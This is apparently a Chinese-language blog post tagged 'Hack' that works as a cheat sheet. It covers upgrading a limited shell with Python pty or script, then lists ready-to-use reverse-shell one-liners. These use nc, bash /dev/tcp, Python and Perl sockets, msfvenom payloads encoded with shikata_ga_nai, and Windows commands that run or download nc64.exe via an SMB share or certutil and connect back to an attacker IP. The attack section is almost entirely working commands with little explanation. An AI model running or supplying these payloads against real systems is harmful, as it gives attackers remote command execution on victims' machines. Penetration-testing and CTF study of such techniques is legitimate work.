---
title: Bash 逃逸及反弹 Shell 合集
date: 2026-03-01T21:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
---
## Bash 逃逸

在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。

```bash
python3 -c "import pty;pty.spawn('/bin/bash');"
```

运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。

也可以尝试下面的命令。

```bash
script -qc /bin/bash /dev/null
```

script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。

## 反弹 shell

### Linux

#### Nc

```shell
nc -e /bin/bash 10.10.10.5 4444
```

#### Bash

```bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"
```

#### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

#### Perl

```bash
perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Msfvenom

Msf 生成反弹 shell

```bash
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
```

生成二进制脚本

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c
```

```bash
sudo msfvenom -p linux/x86/exec CMD="/bin/bash" -b "\x00" -e x86/shikata_ga_nai -f c
```

### Windows

```bash
START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe
```

启动后台运行，使用共享文件夹的 nc 绑定回连端口的 cmd。

```bash
certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:\Programdata\nc64.exe C:\Programdata\nc64.exe 10.10.16.58 443 -e powershell.exe
```

从 Kali 中下载 nc64.exe 到 Programdata 下，再使用 nc64 回连至 Kali。